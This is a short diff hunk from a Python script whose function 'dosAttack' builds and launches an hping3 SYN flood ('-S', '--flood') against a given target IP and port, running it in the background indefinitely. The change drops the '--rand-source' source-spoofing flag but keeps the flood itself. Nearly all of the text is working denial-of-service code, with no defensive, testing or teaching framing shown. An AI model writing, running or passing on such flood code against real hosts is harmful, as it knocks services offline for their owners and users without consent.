@@ -5,7 +5,7 @@ import time
 def dosAttack(targetIP, targetPort):
     print(f"[+] Launching hping3 flood against {targetIP}:{targetPort}...")
     # hping3 needs strings in the list. targetPort must be converted.
-    cmd = ["hping3", "-S", "-p", str(targetPort), "--flood", "--rand-source",targetIP]
+    cmd = ["hping3", "-S", "-p", str(targetPort), "--flood", targetIP]
     try:
         # Popen runs in the background. 
         # Note: This will run forever until you close the terminal or kill the PID.
